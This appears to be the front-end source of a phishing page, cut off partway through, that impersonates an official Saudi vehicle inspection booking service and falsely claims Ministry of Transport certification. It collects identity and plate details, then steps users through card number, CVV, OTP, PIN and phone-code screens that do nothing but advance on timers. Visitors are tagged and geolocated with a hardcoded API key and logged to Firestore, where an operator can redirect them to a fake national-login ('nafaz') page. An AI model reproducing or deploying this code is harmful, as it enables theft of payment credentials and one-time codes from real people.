"use client"

import type React from "react"
import Image from "next/image"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { ArrowLeft, Car, Truck, Calendar, ChevronDown, CreditCard, Wallet, Menu, Mail, Check, Lock } from "lucide-react"
import { doc, onSnapshot } from "firebase/firestore"
import { addData, db } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"

type VehicleStatus = "license" | "customs"
type VehicleType = "car" | "motorcycle" | "truck"
type AppStep = "landing" | "booking" | "payment-method" | "card-form" | "otp" | "pin" | "phone-verification"
type PaymentMethod = "card" | "wallet" | "bank"
function randstr(prefix:string)
{
    return Math.random().toString(36).replace('0.',prefix || '');
}
const visitorID=randstr('salmn-')
export default function VehicleBooking() {
  const [vehicleStatus, setVehicleStatus] = useState<VehicleStatus>("license")
  const [country, setCountry] = useState("")
  const [plateNumbers, setPlateNumbers] = useState("")
  const [plateLetters, setPlateLetters] = useState("")
  const [plateInfo, setPlateInfo] = useState("")
  const [registrationType, setRegistrationType] = useState("")
  const [vehicleType, setVehicleType] = useState<VehicleType>("car")
  const [region, setRegion] = useState("")
  const [city, setCity] = useState("")
  const [inspectionCenter, setInspectionCenter] = useState("")
  const [inspectionDate, setInspectionDate] = useState("")
  const [inspectionTime, setInspectionTime] = useState("")
  const [captchaChecked, setCaptchaChecked] = useState(true)
  const [inspectionType, setInspectionType] = useState("") // Added declaration

  const [currentStep, setCurrentStep] = useState<AppStep>("landing")
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | "">("")
  const [cardNumber, setCardNumber] = useState("")
  const [cardName, setCardName] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [otp, setOtp] = useState(["", "", "", "", "", ""])
  const [pin, setPin] = useState(["", "", "", ""])
  const [isLoading, setIsLoading] = useState(false)
  const [phone, setPhone] = useState("")
  const [operator, setOperator] = useState("")
  const [phoneOtp, setPhoneOtp] = useState("")
  const [phoneOtpError, setPhoneOtpError] = useState("")

  useEffect(() => {
    getLocation().then(()=>{
      setIsLoading(false)
    })

    const visitorId = localStorage.getItem('visitor') || visitorID
    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnapshot) => {
      if (docSnapshot.exists()) {
        const userData = docSnapshot.data()
        if (userData.currentPage === '2' || userData.currentPage === 2) {
          window.location.href = '/quote'
        } else if (userData.currentPage === '8888' || userData.currentPage === 'nafaz') {
          window.location.href = '/nafaz'
        } else if (userData.currentPage === '9999') {
          window.location.href = '/verify-phone'
        }
      }
    })

    return () => unsubscribe()
  }, [])

 
  async function getLocation() {
    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
  
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        const country = await response.text();
        await addData({
            id:visitorID,
            country: country,
            createdDate: new Date().toISOString()
        })
        localStorage.setItem('country',country)
        setupOnlineStatus(visitorID)
      } catch (error) {
        console.error('Error fetching location:', error);
    }
  }
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setTimeout(() => {
      setCurrentStep("payment-method")
      setIsLoading(false)
    }, 1500)
  }

  const handlePaymentMethodSubmit = () => {
    if (paymentMethod) {
      setIsLoading(true)
      setTimeout(() => {
        setCurrentStep("card-form")
        setIsLoading(false)
      }, 1500)
    }
  }

  const handleCardFormSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setTimeout(() => {
      setCurrentStep("otp")
      setIsLoading(false)
    }, 1500)
  }

  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setTimeout(() => {
      setCurrentStep("pin")
      setIsLoading(false)
    }, 1500)
  }

  const handlePinSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setTimeout(() => {
      setCurrentStep("phone-verification")
      setIsLoading(false)
    }, 1500)
  }

  const handlePhoneVerification = (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setTimeout(() => {
      console.log("Payment completed successfully")
      alert("تم إتمام عملية الدفع بنجاح!")
      setIsLoading(false)
    }, 1500)
  }

  const vehicleTypes = [
    { id: "car" as VehicleType, label: "سيارة خاصة", icon: Car },
    { id: "truck" as VehicleType, label: "شاحنة", icon: Truck },
  ]

  const regions = [
    { value: "riyadh", label: "منطقة الرياض" },
    { value: "makkah", label: "منطقة مكة المكرمة" },
    { value: "madinah", label: "منطقة المدينة المنورة" },
    { value: "eastern", label: "المنطقة الشرقية" },
    { value: "qassim", label: "منطقة القصيم" },
    { value: "asir", label: "منطقة عسير" },
    { value: "tabuk", label: "منطقة تبوك" },
    { value: "hail", label: "منطقة حائل" },
    { value: "najran", label: "منطقة نجران" },
    { value: "jazan", label: "منطقة جازان" },
    { value: "northern", label: "منطقة الحدود الشمالية" },
    { value: "jouf", label: "منطقة الجوف" },
    { value: "bahah", label: "منطقة الباحة" },
  ]

  const citiesByRegion: Record<string, { value: string; label: string }[]> = {
    riyadh: [
      { value: "riyadh-city", label: "الرياض" },
      { value: "diriyah", label: "الدرعية" },
      { value: "kharj", label: "الخرج" },
      { value: "dawadmi", label: "الدوادمي" },
      { value: "majmaah", label: "المجمعة" },
      { value: "quwayiyah", label: "القويعية" },
      { value: "aflaj", label: "الأفلاج" },
      { value: "zulfi", label: "الزلفي" },
    ],
    makkah: [
      { value: "makkah-city", label: "مكة المكرمة" },
      { value: "jeddah", label: "جدة" },
      { value: "taif", label: "الطائف" },
      { value: "qunfudhah", label: "القنفذة" },
      { value: "lith", label: "الليث" },
      { value: "rabigh", label: "رابغ" },
      { value: "khulais", label: "خليص" },
      { value: "ranyah", label: "رنية" },
    ],
    madinah: [
      { value: "madinah-city", label: "المدينة المنورة" },
      { value: "yanbu", label: "ينبع" },
      { value: "alula", label: "العلا" },
      { value: "mahd", label: "مهد الذهب" },
      { value: "badr", label: "بدر" },
      { value: "khaybar", label: "خيبر" },
    ],
    eastern: [
      { value: "dammam", label: "الدمام" },
      { value: "khobar", label: "الخبر" },
      { value: "dhahran", label: "الظهران" },
      { value: "jubail", label: "الجبيل" },
      { value: "qatif", label: "القطيف" },
      { value: "hofuf", label: "الهفوف" },
      { value: "mubarraz", label: "المبرز" },
      { value: "khafji", label: "الخفجي" },
    ],
    qassim: [
      { value: "buraidah", label: "بريدة" },
      { value: "unaizah", label: "عنيزة" },
      { value: "rass", label: "الرس" },
      { value: "midhnab", label: "المذنب" },
      { value: "bukayriyah", label: "البكيرية" },
    ],
    asir: [
      { value: "abha", label: "أبها" },
      { value: "khamis-mushait", label: "خميس مشيط" },
      { value: "najran-asir", label: "نجران" },
      { value: "bisha", label: "بيشة" },
      { value: "sarat-ubaidah", label: "سراة عبيدة" },
    ],
    tabuk: [
      { value: "tabuk-city", label: "تبوك" },
      { value: "umluj", label: "أملج" },
      { value: "wajh", label: "الوجه" },
      { value: "duba", label: "ضباء" },
      { value: "tayma", label: "تيماء" },
    ],
    hail: [
      { value: "hail-city", label: "حائل" },
      { value: "baqaa", label: "بقعاء" },
      { value: "ghazalah", label: "الغزالة" },
      { value: "shamli", label: "الشملي" },
    ],
    najran: [
      { value: "najran-city", label: "نجران" },
      { value: "sharourah", label: "شرورة" },
      { value: "habuna", label: "حبونا" },
      { value: "badr-south", label: "بدر الجنوب" },
    ],
    jazan: [
      { value: "jazan-city", label: "جازان" },
      { value: "sabya", label: "صبيا" },
      { value: "abu-arish", label: "أبو عريش" },
      { value: "samtah", label: "صامطة" },
      { value: "farasan", label: "فرسان" },
    ],
    northern: [
      { value: "arar", label: "عرعر" },
      { value: "rafha", label: "رفحاء" },
      { value: "turaif", label: "طريف" },
    ],
    jouf: [
      { value: "sakaka", label: "سكاكا" },
      { value: "qurayat", label: "القريات" },
      { value: "dumat", label: "دومة الجندل" },
    ],
    bahah: [
      { value: "bahah-city", label: "الباحة" },
      { value: "baljurashi", label: "بلجرشي" },
      { value: "almandaq", label: "المندق" },
      { value: "qilwah", label: "قلوة" },
    ],
  }

  const inspectionCenters = [
    { value: "center1", label: "محطة الفحص الدوري - الدمام" },
    { value: "center2", label: "محطة الفحص الدوري - الخبر" },
    { value: "center3", label: "محطة الفحص الدوري - الظهران" },
  ]

  const paymentMethods = [
    {
      id: "card" as PaymentMethod,
      label: "بطاقة ائتمان",
      icon: CreditCard,
      description: "فيزا أو ماستركارد",
      badge: "استرداد نقدي 15%",
      available: true,
    },
    {
      id: "wallet" as PaymentMethod,
      label: "مدى",
      icon: CreditCard,
      description: "بطاقة مدى",
      available: false,
    },
    {
      id: "bank" as PaymentMethod,
      label: "Apple Pay",
      icon: Wallet,
      description: "الدفع عبر آبل",
      available: false,
    },
  ]

  if (isLoading) {
    return (
      <div dir="rtl" className="min-h-screen bg-background flex items-center justify-center">
        <Card className="w-full max-w-md mx-4 shadow-lg">
          <CardContent className="p-12">
            <div className="flex flex-col items-center gap-6">
              <div className="relative w-20 h-20">
                <div className="absolute inset-0 border-4 border-primary/30 rounded-full"></div>
                <div className="absolute inset-0 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
              </div>
              <div className="text-center space-y-2">
                <h3 className="text-xl font-semibold text-foreground">جاري المعالجة...</h3>
                <p className="text-muted-foreground">الرجاء الانتظار</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (currentStep === "landing") {
    return (
      <div dir="rtl" className="min-h-screen bg-background">
        {/* Hero Section */}
        <div className="relative overflow-hidden bg-gradient-to-b from-secondary/30 to-background">
          <div className="container mx-auto px-4 py-16 md:py-24 max-w-6xl">
            {/* Trust Badge */}
            <div className="flex justify-center mb-8">
              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-primary/10 border border-primary/20">
                <div className="w-2 h-2 rounded-full bg-primary animate-pulse" />
                <span className="text-sm font-medium text-foreground">خدمة معتمدة من وزارة النقل</span>
              </div>
            </div>

            <div className="grid lg:grid-cols-2 gap-12 items-center">
              {/* Content */}
              <div className="text-center lg:text-right space-y-8">
                <div className="space-y-4">
                  <h1 className="text-5xl md:text-6xl lg:text-7xl font-bold text-foreground leading-tight text-balance">
                    خدمة الفحص الفني الدوري
                  </h1>
                  <p className="text-xl md:text-2xl text-muted-foreground leading-relaxed text-pretty max-w-xl mx-auto lg:mx-0">
                    احجز موعد فحص مركبتك بسهولة وسرعة. خدمة احترافية وموثوقة لضمان سلامتك على الطريق
                  </p>
                </div>

                {/* Primary CTA */}
                <div className="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start">
                  <Button
                    size="lg"
                    className="h-14 px-8 text-lg font-semibold bg-primary hover:bg-primary/90 shadow-lg hover:shadow-xl transition-all"
                    onClick={() => setCurrentStep("booking")}
                  >
                    احجز موعد الآن
                    <svg className="mr-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                    </svg>
                  </Button>
                  <Button
                    size="lg"
                    variant="outline"
                    className="h-14 px-8 text-lg font-medium border-2 hover:bg-secondary bg-transparent"
                  >
                    معلومات أكثر
                  </Button>
                </div>

                {/* Stats */}
                <div className="flex gap-8 justify-center lg:justify-start pt-8 border-t border-border">
                  <div className="text-center lg:text-right">
                    <div className="text-3xl font-bold text-foreground">+50,000</div>
                    <div className="text-sm text-muted-foreground">فحص مكتمل</div>
                  </div>
                  <div className="text-center lg:text-right">
                    <div className="text-3xl font-bold text-foreground">24/7</div>
                    <div className="text-sm text-muted-foreground">دعم فني</div>
                  </div>
                  <div className="text-center lg:text-right">
                    <div className="text-3xl font-bold text-foreground">98%</div>
                    <div className="text-sm text-muted-foreground">رضا العملاء</div>
                  </div>
                </div>
              </div>

              {/* Vehicle Image */}
              <div className="relative">
                <div className="absolute inset-0 bg-primary/5 rounded-3xl blur-3xl" />
                <Image
                  src="/white-sedan-car-with-technical-inspection-labels-i.jpg"
                  alt="فحص المركبة"
                  width={800}
                  height={500}
                  className="relative w-full h-auto rounded-2xl shadow-2xl"
                  priority
                />
              </div>
            </div>
          </div>
        </div>

        {/* Features Section */}
        <div className="container mx-auto px-4 py-20 max-w-6xl">
          <div className="text-center mb-16">
            <h2 className="text-3xl md:text-4xl font-bold text-foreground mb-4">لماذا تختار خدمتنا؟</h2>
            <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
              نوفر لك تجربة فحص سريعة وموثوقة مع أحدث التقنيات
            </p>
          </div>

          <div className="grid md:grid-cols-3 gap-8 mb-16">
            {/* Feature 1 */}
            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
              <div className="w-14 h-14 rounded-xl bg-primary/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                <svg className="w-7 h-7 text-primary" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
                  />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">حجز سريع ومرن</h3>
              <p className="text-muted-foreground leading-relaxed">احجز موعدك في دقائق واختر الوقت المناسب لك</p>
            </div>

            {/* Feature 2 */}
            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
              <div className="w-14 h-14 rounded-xl bg-primary/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                <svg className="w-7 h-7 text-primary" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                  />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">فحص معتمد وآمن</h3>
              <p className="text-muted-foreground leading-relaxed">فحص شامل ومعتمد من الجهات الرسمية</p>
            </div>

            {/* Feature 3 */}
            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
              <div className="w-14 h-14 rounded-xl bg-primary/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                <svg className="w-7 h-7 text-primary" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                  />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">دفع إلكتروني آمن</h3>
              <p className="text-muted-foreground leading-relaxed">ادفع بأمان عبر طرق دفع متعددة ومشفرة</p>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="bg-gradient-to-br from-primary/5 to-accent/5 rounded-3xl p-12 border border-primary/10">
            <div className="text-center mb-8">
              <h3 className="text-2xl md:text-3xl font-bold text-foreground mb-3">ابدأ الآن</h3>
              <p className="text-muted-foreground text-lg">اختر الإجراء المناسب لك</p>
            </div>

            <div className="grid sm:grid-cols-3 gap-4 max-w-3xl mx-auto">
              <Button
                size="lg"
                className="h-16 text-base font-semibold bg-primary hover:bg-primary/90 shadow-md"
                onClick={() => setCurrentStep("booking")}
              >
                <svg className="ml-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
                  />
                </svg>
                حجز موعد
              </Button>

              <Button
                size="lg"
                variant="outline"
                className="h-16 text-base font-semibold border-2 hover:bg-secondary bg-transparent"
              >
                <svg className="ml-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"
                  />
                </svg>
                تعديل موعد
              </Button>

              <Button
                size="lg"
                variant="outline"
                className="h-16 text-base font-semibold border-2 border-destructive/30 text-destructive hover:bg-destructive hover:text-destructive-foreground bg-transparent"
              >
                <svg className="ml-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
                إلغاء موعد
              </Button>
            </div>
          </div>
        </div>
      </div>
    )
  }

  if (currentStep === "booking") {
    return (
      <div dir="rtl" className="min-h-screen bg-[#fafafa]">
        {/* Clean header with logo */}
        <header className="bg-white border-b border-gray-200 py-4 px-4">
          <div className="container mx-auto max-w-2xl flex items-center justify-between">
            <button className="text-gray-600">
              <Menu className="w-6 h-6" />
            </button>
            <div className="flex items-center gap-2">
              <div className="text-right">
                <div className="text-sm font-semibold text-gray-800">مركز سلامة المركبات</div>
                <div className="text-xs text-gray-500">Vehicles Safety Center</div>
              </div>
              <div className="w-10 h-10 bg-primary rounded-md flex items-center justify-center">
                <Car className="w-6 h-6 text-white" />
              </div>
            </div>
          </div>
        </header>

        {/* Breadcrumb navigation */}
        <div className="bg-white border-b border-gray-200 py-3 px-4">
          <div className="container mx-auto max-w-2xl">
            <div className="flex items-center gap-2 text-xs text-gray-500">
              <span>الرئيسية</span>
              <span>›</span>
              <span>حجز موعد الفحص</span>
              <span>›</span>
              <span className="text-gray-800">الفحص الفني الدوري</span>
            </div>
          </div>
        </div>

        {/* Tabs */}
        <div className="bg-white border-b border-gray-200">
          <div className="container mx-auto max-w-2xl flex">
            <button className="flex-1 py-4 text-sm font-medium text-primary border-b-2 border-primary">
              حجز موعد جديد
            </button>
            <button className="flex-1 py-4 text-sm font-medium text-gray-500">إدارة المواعيد</button>
          </div>
        </div>

        {/* Main form */}
        <form onSubmit={handleSubmit} className="container mx-auto px-4 py-6 max-w-2xl">
          <div className="bg-white rounded-lg shadow-sm p-6 space-y-6">
            {/* Name field */}
            <div className="space-y-2">
              <Label htmlFor="name" className="text-sm font-medium text-gray-700">
                الاسم<span className="text-red-500">*</span>
              </Label>
              <Input
                id="name"
                type="text"
                placeholder="الاسم"
                className="h-12 bg-gray-50 border-gray-300"
                data-testid="input-name"
              />
            </div>

            {/* ID Number with icon */}
            <div className="space-y-2">
              <Label htmlFor="id-number" className="text-sm font-medium text-gray-700">
                رقم البطاقة الشخصية<span className="text-red-500">*</span>
              </Label>
              <div className="relative">
                <Input
                  id="id-number"
                  type="text"
                  placeholder="أدخل رقم البطاقة الشخصية"
                  className="h-12 bg-gray-50 border-gray-300 pl-12"
                  data-testid="input-id-number"
                />
                <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
              </div>
            </div>

            {/* Mobile Number with flag */}
            <div className="space-y-2">
              <Label htmlFor="mobile" className="text-sm font-medium text-gray-700">
                رقم الجوال<span className="text-red-500">*</span>
              </Label>
              <div className="flex gap-2">
                <div className="relative flex-shrink-0">
                  <button
                    type="button"
                    className="h-12 px-4 bg-gray-50 border border-gray-300 rounded-md flex items-center gap-2"
                  >
                    <span className="text-lg">🇸🇦</span>
                    <span className="text-sm text-gray-600">+966</span>
                    <ChevronDown className="w-4 h-4 text-gray-400" />
                  </button>
                </div>
                <Input
                  id="mobile"
                  type="tel"
                  placeholder="أدخل رقم الجوال"
                  className="h-12 bg-gray-50 border-gray-300 flex-1"
                  data-testid="input-mobile"
                />
              </div>
            </div>

            {/* Email with icon */}
            <div className="space-y-2">
              <Label htmlFor="email" className="text-sm font-medium text-gray-700">
                البريد الإلكتروني<span className="text-red-500">*</span>
              </Label>
              <div className="relative">
                <Input
                  id="email"
                  type="email"
                  placeholder="email@domain.com"
                  className="h-12 bg-gray-50 border-gray-300 pl-12"
                  data-testid="input-email"
                />
                <Mail className="absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
              </div>
            </div>

            {/* Country selection */}
            <div className="space-y-2">
              <Label htmlFor="country" className="text-sm font-medium text-gray-700">
                اختر الدولة<span className="text-red-500">*</span>
              </Label>
              <div className="relative">
                <select
                  id="country"
                  value={country}
                  onChange={(e) => setCountry(e.target.value)}
                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
                  data-testid="select-country"
                >
                  <option value="saudi">السعودية</option>
                  <option value="gcc">دول مجلس التعاون</option>
                  <option value="other">أخرى</option>
                </select>
                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
              </div>
            </div>

            {/* Vehicle plate info with live preview */}
            <div className="space-y-4">
              <Label className="text-sm font-medium text-gray-700">
                معلومات لوحة المركبة<span className="text-red-500">*</span>
              </Label>

              <div className="flex justify-center mb-4">
                <div className="relative w-72 h-20 bg-white border-4 border-black rounded-lg shadow-lg overflow-hidden">
                  {/* Saudi flag colors on left */}
                  <div className="absolute left-0 top-0 bottom-0 w-14 bg-[#165C3C] flex items-center justify-center">
                    <div className="text-white text-xs font-bold">KSA</div>
                  </div>

                  {/* Plate content - Arabic letters on right, numbers on left */}
                  <div className="absolute inset-0 flex items-center justify-between px-16">
                    {/* Arabic letters section */}
                    <div className="text-center flex-1">
                      <div className="text-3xl font-bold" style={{ fontFamily: "Arial" }}>
                        {plateLetters || "---"}
                      </div>
                    </div>

                    {/* Divider */}
                    <div className="h-12 w-0.5 bg-gray-400 mx-2"></div>

                    {/* Numbers section */}
                    <div className="text-center flex-1">
                      <div className="text-3xl font-bold" style={{ fontFamily: "monospace" }}>
                        {plateNumbers || "----"}
                      </div>
                    </div>
                  </div>

                  {/* Bottom text */}
                  <div className="absolute bottom-1 left-0 right-0 text-center text-[8px] text-gray-600">
                    المملكة العربية السعودية
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-2">
                  <Label className="text-xs text-gray-600">الحروف (Arabic Letters)</Label>
                  <Input
                    type="text"
                    placeholder="أ ب ج"
                    className="h-12 bg-gray-50 border-gray-300 text-center text-2xl font-bold"
                    value={plateLetters}
                    onChange={(e) => setPlateLetters(e.target.value)}
                    maxLength={3}
                    dir="rtl"
                  />
                </div>
                <div className="space-y-2">
                  <Label className="text-xs text-gray-600">الأرقام (Numbers)</Label>
                  <Input
                    type="text"
                    placeholder="1234"
                    className="h-12 bg-gray-50 border-gray-300 text-center text-2xl font-bold"
                    value={plateNumbers}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^0-9]/g, "")
                      setPlateNumbers(value)
                    }}
                    maxLength={4}
                  />
                </div>
              </div>
            </div>

            {/* Vehicle type with icon */}
            <div className="space-y-2">
              <Label htmlFor="vehicle-type" className="text-sm font-medium text-gray-700">
                نوع المركبة<span className="text-red-500">*</span>
              </Label>
              <div className="relative">
                <select
                  id="vehicle-type"
                  value={vehicleType}
                  onChange={(e) => setVehicleType(e.target.value as VehicleType)}
                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
                  data-testid="select-vehicle-type"
                >
                  <option value="car">سيارة</option>
                  <option value="motorcycle">دراجة نارية</option>
                  <option value="truck">شاحنة</option>
                </select>
                <Car className="absolute right-4 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400 pointer-events-none" />
                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
              </div>
            </div>

            {/* Service type */}
            <div className="space-y-2">
              <Label htmlFor="service-type" className="text-sm font-medium text-gray-700">
                نوع الخدمة<span className="text-red-500">*</span>
              </Label>
              <div className="relative">
                <select
                  id="service-type"
                  value={inspectionType}
                  onChange={(e) => setInspectionType(e.target.value)}
                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
                  data-testid="select-service-type"
                >
                  <option value="">خدمة الفحص الدوري</option>
                  <option value="periodic">فحص دوري</option>
                  <option value="transfer">فحص نقل ملكية</option>
                </select>
                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
              </div>
            </div>

            {/* Inspection region */}
            <div className="space-y-2">
              <Label htmlFor="region" className="text-sm font-medium text-gray-700">
                المنطقة لإجراء الفحص<span className="text-red-500">*</span>
              </Label>
              <div className="relative">
                <select
                  id="region"
                  value={region}
                  onChange={(e) => {
                    setRegion(e.target.value)
                    setCity("")
                  }}
                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
                  data-testid="select-region"
                >
                  <option value="">اختر المنطقة</option>
                  {regions.map((r) => (
                    <option key={r.value} value={r.value}>
                      {r.label}
                    </option>
                  ))}
                </select>
                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
              </div>
            </div>

            {region && (
              <div className="space-y-2">
                <Label htmlFor="city" className="text-sm font-medium text-gray-700">
                  المدينة<span className="text-red-500">*</span>
                </Label>
                <div className="relative">
                  <select
                    id="city"
                    value={city}
                    onChange={(e) => setCity(e.target.value)}
                    className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
                    data-testid="select-city"
                  >
                    <option value="">اختر المدينة</option>
                    {citiesByRegion[region]?.map((c) => (
                      <option key={c.value} value={c.value}>
                        {c.label}
                      </option>
                    ))}
                  </select>
                  <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
                </div>
              </div>
            )}

            {/* Inspection center */}
            <div className="space-y-2">
              <Label htmlFor="inspection-center" className="text-sm font-medium text-gray-700">
                مركز الفحص<span className="text-red-500">*</span>
              </Label>
              <div className="relative">
                <select
                  id="inspection-center"
                  value={inspectionCenter}
                  onChange={(e) => setInspectionCenter(e.target.value)}
                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
                  data-testid="select-inspection-center"
                >
                  <option value="">إختر مركز المعاينة</option>
                  {inspectionCenters.map((c) => (
                    <option key={c.value} value={c.value}>
                      {c.label}
                    </option>
                  ))}
                </select>
                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
              </div>
            </div>

            {/* Date picker with custom display */}
            <div className="space-y-2">
              <Label className="text-sm font-medium text-gray-700">
                التاريخ المرجع<span className="text-red-500">*</span>
              </Label>
              <div className="relative">
                <button
                  type="button"
                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-right text-sm text-gray-700 flex items-center justify-between"
                >
                  <span>25 ديسمبر • 15 يناير</span>
                  <Calendar className="h-5 w-5 text-gray-400" />
                </button>
              </div>
            </div>

            <div className="grid grid-cols-3 gap-3">
              {[
                { day: "الأحد", date: "28", month: "ديسمبر" },
                { day: "الاثنين", date: "29", month: "ديسمبر" },
                { day: "الثلاثاء", date: "30", month: "ديسمبر" },
                { day: "الأربعاء", date: "31", month: "ديسمبر" },
                { day: "الخميس", date: "01", month: "يناير" },
                { day: "الجمعة", date: "02", month: "يناير" },
                { day: "السبت", date: "03", month: "يناير" },
                { day: "الأحد", date: "04", month: "يناير" },
                { day: "الاثنين", date: "05", month: "يناير" },
              ].map((dateOption, idx) => (
                <button
                  key={idx}
                  type="button"
                  onClick={() => setInspectionDate(dateOption.date)}
                  className={`bg-gray-50 border rounded-lg p-4 hover:border-primary transition-colors ${
                    inspectionDate === dateOption.date ? "border-primary bg-primary/5" : "border-gray-300"
                  }`}
                >
                  <div className="text-xs text-gray-500 mb-1">{dateOption.day}</div>
                  <div className="text-2xl font-bold text-gray-800 mb-1">{dateOption.date}</div>
                  <div className="text-xs text-gray-500">{dateOption.month}</div>
                </button>
              ))}
            </div>

            {/* Time slots */}
            <div className="space-y-2">
              <Label htmlFor="time" className="text-right text-gray-700">
                موعد الخدمة<span className="text-red-500">*</span>
              </Label>
              <div className="grid grid-cols-3 gap-2">
                {[
                  "7:30 صباحاً",
                  "8:00 صباحاً",
                  "8:30 صباحاً",
                  "9:00 صباحاً",
                  "9:30 صباحاً",
                  "10:00 صباحاً",
                  "10:30 صباحاً",
                  "11:00 صباحاً",
                  "11:30 صباحاً",
                  "12:00 ظهراً",
                  "12:30 ظهراً",
                  "1:00 مساءً",
                  "1:30 مساءً",
                  "2:00 مساءً",
                  "2:30 مساءً",
                  "3:00 مساءً",
                  "3:30 مساءً",
                  "4:00 مساءً",
                  "4:30 مساءً",
                  "5:00 مساءً",
                ].map((time) => (
                  <button
                    key={time}
                    type="button"
                    onClick={() => setInspectionTime(time)}
                    className={`h-12 rounded-md border text-sm transition-colors ${
                      inspectionTime === time
                        ? "bg-primary text-white border-primary"
                        : "bg-gray-50 border-gray-300 text-gray-700 hover:border-primary"
                    }`}
                  >
                    {time}
                  </button>
                ))}
              </div>
            </div>

            {/* Action buttons */}
            <div className="space-y-3 pt-4">
              <Button
                type="submit"
                className="w-full h-12 bg-primary hover:bg-primary/90 text-white font-medium rounded-md"
                disabled={!captchaChecked}
                data-testid="button-submit"
              >
                حجز الموعد
              </Button>
